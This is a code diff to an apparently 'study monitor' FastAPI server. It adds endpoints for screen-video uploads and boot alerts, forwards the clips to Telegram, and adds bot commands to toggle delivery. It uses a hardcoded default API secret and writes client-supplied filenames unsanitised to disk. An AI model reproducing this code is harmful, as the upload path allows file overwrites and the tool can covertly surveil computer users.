@@ -158,6 +158,27 @@ def send_telegram_photo(photo_path: Path, caption: str):
         except Exception:
             pass
 
+def send_telegram_video(video_path: Path, caption: str):
+    cfg = load_config()
+    if not cfg.get("send_videos_to_telegram", True):
+        return
+    token = cfg.get("telegram_bot_token")
+    chat_ids = cfg.get("telegram_chat_ids", [])
+    if not token or not chat_ids or not video_path.exists():
+        return
+    url = f"https://api.telegram.org/bot{token}/sendVideo"
+    for cid in chat_ids:
+        try:
+            with open(video_path, "rb") as vf:
+                requests.post(
+                    url,
+                    data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"},
+                    files={"video": vf},
+                    timeout=90
+                )
+        except Exception as e:
+            print(f"[Telegram] Error sending video: {e}")
+
 # ----------------- PLACEHOLDER CCTV IMAGE GENERATOR -----------------
 
 def generate_no_signal_image(computer_name: str) -> bytes:
@@ -304,6 +325,18 @@ async def telegram_bot_poller():
                                 send_telegram_photo(shots[-1], f"📸 *[{target_pc.upper()}]* Recent Screenshot")
                             else:
                                 send_telegram_message(f"ℹ️ No screenshot available yet for {target_pc}.")
+
+                    elif cmd in ["/showvideos", "/videos_on"]:
+                        cfg = load_config()
+                        cfg["send_videos_to_telegram"] = True
+                        save_config(cfg)
+                        send_telegram_message("📹 *Automatic Video Delivery Enabled:*\nScreen video recording clips will be sent directly to Telegram.")
+
+                    elif cmd in ["/hidevideos", "/videos_off"]:
+                        cfg = load_config()
+                        cfg["send_videos_to_telegram"] = False
+                        save_config(cfg)
+                        send_telegram_message("🔇 *Automatic Video Delivery Muted:*\nVideo clips will be saved on server/web only.")
 
                     elif cmd in ["/link", "/web", "/url", "/portal"]:
                         cfg = load_config()
@@ -683,6 +716,61 @@ async def client_upload_screenshot(
     print(f"[Screenshot] [{pc_name}] Received 5-min snapshot: {dest_path.name} ({file_size_kb} KB)")
 
     return {"ok": True, "filename": dest_path.name}
+
+@app.post("/api/client/upload_video")
+@app.post("/api/client/upload")
+async def client_upload_video(
+    request: Request,
+    video: UploadFile = File(...),
+    computer_name: str = Form("albayan 1"),
+    x_api_secret: Optional[str] = Header(None)
+):
+    cfg = load_config()
+    if x_api_secret != cfg.get("api_secret", "secure_study_monitor_secret_key_8899"):
+        raise HTTPException(status_code=403, detail="Forbidden")
+
+    pc_name = normalize_pc_name(computer_name)
+    client_ip = request.client.host if request.client else "unknown"
+
+    if pc_name not in active_computers:
+        active_computers[pc_name] = {}
+    active_computers[pc_name]["last_ping"] = time.time()
+    active_computers[pc_name]["ip"] = client_ip
+
+    dest_path = RECORDINGS_DIR / video.filename
+    with open(dest_path, "wb") as f:
+        while chunk := await video.read(1024 * 1024):
+            f.write(chunk)
+
+    file_size_mb = round(dest_path.stat().st_size / (1024 * 1024), 2)
+    print(f"[Video Upload] [{pc_name}] Received Video Clip: {dest_path.name} ({file_size_mb} MB)")
+
+    # Send video automatically to Telegram
+    if cfg.get("send_videos_to_telegram", True):
+        now_str = datetime.now().strftime("%I:%M %p")
+        caption = f"📹 *[{pc_name.upper()}] Screen Video Recording*\n🕒 Time: {now_str}\n📁 File: `{dest_path.name}`\n📦 Size: {file_size_mb} MB"
+        threading.Thread(target=send_telegram_video, args=(dest_path, caption), daemon=True).start()
+
+    return {"ok": True, "filename": dest_path.name}
+
+@app.post("/api/client/boot_notify")
+def client_boot_notify(payload: dict, request: Request, x_api_secret: Optional[str] = Header(None)):
+    cfg = load_config()
+    if x_api_secret != cfg.get("api_secret", "secure_study_monitor_secret_key_8899"):
+        raise HTTPException(status_code=403, detail="Forbidden")
+
+    pc_name = normalize_pc_name(payload.get("computer_name", "albayan 1"))
+    client_ip = request.client.host if request.client else "unknown"
+    now_str = datetime.now().strftime("%I:%M:%S %p")
+
+    print(f"[Boot Notify] [{pc_name}] Computer turned ON at {now_str} (IP: {client_ip})")
+    send_telegram_message(
+        f"🚨 *[{pc_name.upper()}] Computer Turned ON!*\n"
+        f"🕒 Time: *{now_str}*\n"
+        f"🌐 IP: `{client_ip}`\n"
+        f"📹 Automatic screen video recording & CCTV live stream started."
+    )
+    return {"ok": True}
 
 # ----------------- CCTV IMAGE & STREAM API -----------------
 
@@ -1260,7 +1348,7 @@ def get_cctv_dashboard_html():
         
         if (data.public_web_url) {
           document.getElementById('serverIpBadge').innerText = 'REAL WEB LIVE';
-        } else if (window.location.protocol === 'https:' || !window.location.hostname.match(/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/)) {
+        } else if (window.location.protocol === 'https:' || !window.location.hostname.match(/^[0-9]+[.][0-9]+[.][0-9]+[.][0-9]+$/)) {
           document.getElementById('serverIpBadge').innerText = 'REAL WEB LIVE';
         } else {
           document.getElementById('serverIpBadge').innerText = `${data.server_ip}:${data.server_port}`;
